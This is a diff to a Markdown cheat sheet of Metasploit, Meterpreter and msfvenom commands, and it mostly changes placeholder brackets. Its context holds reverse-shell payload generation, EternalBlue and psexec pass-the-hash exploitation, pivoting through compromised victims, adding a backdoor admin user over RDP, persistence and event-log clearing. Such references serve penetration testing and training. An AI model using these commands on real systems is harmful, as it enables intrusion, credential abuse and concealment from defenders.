@@ -1,32 +1,32 @@
 # Metasploit
 ##### Kill Job, but not Existing Meterpreter Shell
 ```bash
-jobs -k <Job #>
+jobs -k [Job ID]
 ```
 
 ##### Search Modules with Grep
 ```bash
-grep <Search String> search type:<Category>
+grep [Search String] search type:[Category]
 
 grep smb search type:exploit
 ```
 
 ##### Get Module Information
 ```bash
-use <Module Name>
+use [Module Name]
 info
 ```
 ### Routes
 ##### Add Route
 ```bash
 meterpreter > ifconfig
-# get <Subnet Mask of Exploited Target>
+# get [Subnet Mask of Exploited Target]
 
-route add <IP> <Subnet Mask of Exploited Target> [Session ID]
+route add [IP] [Subnet Mask of Exploited Target] [Session ID]
 
 use post/multi/manage/autoroute
 set SESSION [Session ID]
-set NETMASK <Subnet Mask of Exploited Target>
+set NETMASK [Subnet Mask of Exploited Target]
 run
 ```
 
@@ -59,14 +59,14 @@ cat /etc/proxychains4.conf
 use auxiliary/server/socks_proxy
 show options
 # SRVPORT and VERSION must match settings in /etc/proxychains4.conf
-set SRVPORT <Port # from /etc/proxychains4.conf> 
-set VERSION <Version> # socks4 = 4a, socks5 = 5.
+set SRVPORT [Port # from /etc/proxychains4.conf]
+set VERSION [Version] # socks4 = 4a, socks5 = 5.
 run
 jobs
 
 # Example command
-proxychains nmap -sT -Pn -n <Target Host on another subnet>
-proxychains ssh <Target Host on another subnet>
+proxychains nmap -sT -Pn -n [Target Host on another subnet]
+proxychains ssh [Target Host on another subnet]
 ```
 
 ### Use with Other Applications
@@ -78,17 +78,17 @@ service postgresql status
 service postgresql start
 
 load nessus
-nessus_connect <Username>:<Password>@<Host>
+nessus_connect [Username]:[Password]@[Host]
 nessus_help
 
 # List current, Nessus scan.
 nessus_scan_list
 
 # List vulnerabilities found in a scan.
-nessus_report_vulns <Scan ID>
+nessus_report_vulns [Scan ID]
 
 # Import Nessus scan
-nessus_db_import <Scan ID>
+nessus_db_import [Scan ID]
 
 # List vulnerabilities from imported scan.
 vulns
@@ -109,7 +109,7 @@ db_nmap
 ```bash
 search to_meterpreter
 use post/multi/manage/shell_to_meterpreter
-set SESSION <Session ID>
+set SESSION [Session ID]
 # LHOST will be IP of machine establishing the shell and may not be the Attack box, in the event of pivoting.
 ```
 
@@ -117,15 +117,15 @@ set SESSION <Session ID>
 ##### Create a Resource Script
 ```bash
 # Save the commands executed since startup to the specified file.
-makerc <Output Rc File>
+makerc [Output Rc File]
 ```
 ##### Import a Resource Script
 ```bash
 # From command prompt
-msfconsole -r <Path to Resource Script>
+msfconsole -r [Path to Resource Script]
 
 # From inside of msfconsole
-resource <Path to Resource Script> [param 1] [param 2] [param 3]
+resource [Path to Resource Script] [param 1] [param 2] [param 3]
 ```
 
 # Meterpreter
@@ -157,13 +157,13 @@ meterpreter > service status-all
 ```
 ##### Upload File
 ```bash
-upload <Source> <Destination>
+upload [Source] [Destination]
 ```
 ##### Start Handler with AutoRunScript to Migrate Process
 ```bash
 use exploit/multi/handler
 set AutoRunScript migrate -n SvcHost.exe
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 set LPORT [Port]
 run -j
 ```
@@ -204,7 +204,7 @@ meterpreter > run getgui -e
 ```
 ##### Enable RDP and Add User
 ```bash
-meterpreter > run getgui -e -u <Username> -p <Password>
+meterpreter > run getgui -e -u [Username] -p [Password]
 # User is created and added to both Administrators and Remote Desktop Users.
 # Additionally, it creates a rule in the Windows firewall.
 ```
@@ -231,12 +231,12 @@ run
 ```
 ##### Migrate to Another Process ID
 ```bash
-migrate <Process ID>
-migrate -P <Process ID>
+migrate [Process ID]
+migrate -P [Process ID]
 ```
 ##### Migrate to Another Process Name
 ```bash
-migrate -N <Process Name>.<Extension>
+migrate -N [Process Name].[Extension]
 ```
 
 ### Get Windows Credentials
@@ -329,10 +329,10 @@ portfwd list
 ##### post/windows/manage/portproxy
 ```bash
 use post/windows/manage/portproxy
-set CONNECT_ADDRESS <Remote IP for Forwarding>
-set CONNECT_PORT <Remote Port for Forwarding>
-set LOCAL_ADDRESS <Local IP for Listening>
-set LOCAL_PORT  <Local Port for Listening>
+set CONNECT_ADDRESS [Remote IP for Forwarding]
+set CONNECT_PORT [Remote Port for Forwarding]
+set LOCAL_ADDRESS [Local IP for Listening]
+set LOCAL_PORT [Local Port for Listening]
 set SESSION [Session ID]
 run
 ```
@@ -347,19 +347,19 @@ meterpreter > clearev
 ##### Multi Handler
 ```bash
 use exploit/multi/handler
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 set LPORT [Port]
-set PAYLOAD <Payload specified in msfvenom>
+set PAYLOAD [Payload specified in msfvenom]
 run -j
 ```
 ##### Multi Handler with PEM
 ```bash
 use exploit/multi/handler
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 set LPORT [Port]
-set HandlerSSLCert <Path to PEM generated>
+set HandlerSSLCert [Path to PEM generated]
 set StagerVerifySSLCert true
-set PAYLOAD <Payload specified in msfvenom>
+set PAYLOAD [Payload specified in msfvenom]
 run -j
 ```
 
@@ -370,11 +370,11 @@ set RHOST www.microsoft.com
 run
 
 use payload/windows/x64/meterpreter/reverse_https
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 set LPORT 443
-set HandlerSSLCert <Path to PEM generated>
+set HandlerSSLCert [Path to PEM generated]
 set StagerVerifySSLCert true
-generate -t exe -f <Path to payload file>
+generate -t exe -f [Path to payload file]
 ```
 
 # msfvenom
@@ -591,7 +591,7 @@ $ msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options
 
 ##### Windows Meterpreter Reverse Shell with Encoding
 ```bash
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Attack Machine> LHOST=[Port] -f exe -e x86/shikata_ga_nai -o <Outpuf File>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Attack Host] LHOST=[Port] -f exe -e x86/shikata_ga_nai -o [Outpuf File]
 ```
 ##### Windows Meterpreter HTTPS Reverse Shell
 ```bash
@@ -609,10 +609,10 @@ msfvenom -p windows/meterpreter/reverse_https LHOST=[Attack Host] LPORT=443 -f d
 msfconsole -q
 use exploit/multi/browser/adobe_flash_hacking_team_uaf
 show options
-set LHOST <Attack Machine>
+set LHOST [Attack Host]
 
 show targets
-set TARGET <Target #>
+set TARGET [Target ID]
 
 show payloads
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
@@ -654,13 +654,13 @@ msfconsole -q
 # Scan target to determine if it is vulnerable to EternalBlue.
 use auxiliary/scanner/smb/smb_ms17_010 
 show options
-set RHOSTS <Target Host>
+set RHOSTS [Target Host]
 # Set SMBDomain, SMBUser, SMBPass settings, if available.
 run
 
 use windows/smb/ms17_010_eternalblue
 show options
-set RHOSTS <Target Host>
+set RHOSTS [Target Host]
 # Set SMBDomain, SMBUser, SMBPass settings, if available.
 exploit
 ```
@@ -675,8 +675,8 @@ use auxiliary/scanner/finger/finger_users
 use 1
 show options
 
-set RHOSTS <SMTP Host>
-set USERS_FILE <Wordlist>
+set RHOSTS [SMTP Host]
+set USERS_FILE [Wordlist]
 run
 ```
 
@@ -685,11 +685,11 @@ run
 ```bash
 msfconsole
 use exploit/windows/smb/psexec
-set RHOSTS <Target Host>
-set SMBUser <Username>
-set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
+set RHOSTS [Target Host]
+set SMBUser [Username]
+set SMBPass [Password] # SMBPass can be the clear text password or the password hash.  
 set PAYLOAD /windows/meterpreter/reverse_tcp
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 exploit
 
 # Error STATUS_ACCESS_DENIED usually means user does not have access to administrative shares.
@@ -716,33 +716,33 @@ meterpreter > reg setval -k 'HKEY_LOCAL_MACHINE\System\CurrentControlSet\Service
 ```bash
 # Add route to Victim 2's subnet, pointing to Victim 1's session.
 use post/windows/manage/autoroute
-set SESSION <Victim 1's Session #>
-set SUBNET <Victim 2's Subnet>
+set SESSION [Victim 1's Session #]
+set SUBNET [Victim 2's Subnet]
 run
 
 use exploit/windows/smb/psexec
-set RHOSTS <Victim 2 Host>
-set SMBUser <Username>
-set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
+set RHOSTS [Victim 2 Host]
+set SMBUser [Username]
+set SMBPass [Password] # SMBPass can be the clear text password or the password hash.  
 set PAYLOAD /windows/meterpreter/reverse_tcp
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 exploit
 ```
 ##### Establish Reverse Shell from Second Victim with SMB using Proxy
 ```bash
 # Add routes to both victims, pointing to Victim 1's session.
 use post/windows/manage/autoroute
-set SESSION <Victim 1's Session #>
-set SUBNET <Victim 1's Subnet>
-set SUBNET <Victim 2's Subnet>
+set SESSION [Victim 1's Session ID]
+set SUBNET [Victim 1's Subnet]
+set SUBNET [Victim 2's Subnet]
 run
 
 use exploit/windows/smb/psexec
-set RHOSTS <Victim 2 Host>
-set SMBUser <Username>
-set SMBPass <Password> # SMBPass can be the clear text password or the password hash.  
+set RHOSTS [Victim 2 Host]
+set SMBUser [Username]
+set SMBPass [Password] # SMBPass can be the clear text password or the password hash.  
 set PAYLOAD /windows/meterpreter/reverse_tcp
-set LHOST <Victim 1 Host>
+set LHOST [Victim 1 Host]
 exploit
 ```
 
@@ -763,7 +763,7 @@ msfconsole
 use exploit/windows/smb/smb_relay
 show options
 
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 set SMBHOST <SMB Server Host
 run
 ```
@@ -779,8 +779,8 @@ use auxiliary/scanner/smtp/smtp_enum
 use 0
 show options
 
-set RHOSTS <SMTP Host>
-set USER_FILE <Wordlist>
+set RHOSTS [SMTP Host]
+set USER_FILE [Wordlist]
 run
 ```
 
@@ -797,11 +797,11 @@ msfconsole -q
 use exploit/multi/vnc/vnc_keyboard_exec
 show options
 
-set RHOSTS <Target Host>
-set PASSWORD <Password>
+set RHOSTS [Target Host]
+set PASSWORD [Password]
 
 show targets
-set TARGET <Target #>
+set TARGET [Target ID]
 
 show payloads
 set PAYLOAD linux/x86/meterpreter/reverse_tcp
@@ -925,7 +925,7 @@ getsystem
 # From Meterpreter shell
 use incognito
 list_tokens -u
-impersonate_token <Token Name> # Escape \'s.
+impersonate_token [Token Name] # Escape \'s.
 ```
 ##### Exploit Unquoted Service Paths
 ```bash
@@ -941,9 +941,9 @@ search persistence windows
 
 use exploit/windows/local/persistence
 set SESSION [Session ID]
-set STARTUP <Startup Type>
+set STARTUP [Startup Type]
 set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <Attack Host>
+set LHOST [Attack Host]
 set LPORT [Port]
 exploit
 ```
